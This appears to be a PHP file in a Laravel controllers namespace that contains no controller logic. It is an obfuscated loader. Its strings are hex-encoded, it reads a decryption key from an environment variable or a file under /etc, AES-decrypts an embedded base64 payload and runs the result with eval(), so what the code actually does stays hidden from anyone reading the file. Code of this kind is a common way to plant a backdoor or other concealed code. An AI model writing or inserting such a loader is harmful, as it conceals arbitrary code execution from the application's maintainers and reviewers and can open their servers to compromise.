<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Djsq1LTC+g2rIad5Rt0icg==');

$c=base64_decode(

'hhT/Z8/kE614n0JnyVtVUsrB9xLLrqfL9bw6eaWcFrhAMdeZDeEZWLKt0IPJrXrNAcBzLD5LkP4C' .
'1VwJL5KdYJsuATp2I1sWMzy5rAgBFdEaVpb1fFsasFWuigjeRjRd/54v4sSKcU6KdqFfGmHtpiRI' .
'8L9kpZgpRNMAe9ucvFr0cH6ZUZ8N7+iBgSDUyFx5Tj8EkLrvT+AWbKSmTjhoEmugu2N3gD+6n3Dy' .
'PLaKU4pIrPmS69n3ETqtgCBkAfoIdcHIfhPxcT8Q++TXA0LJpg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

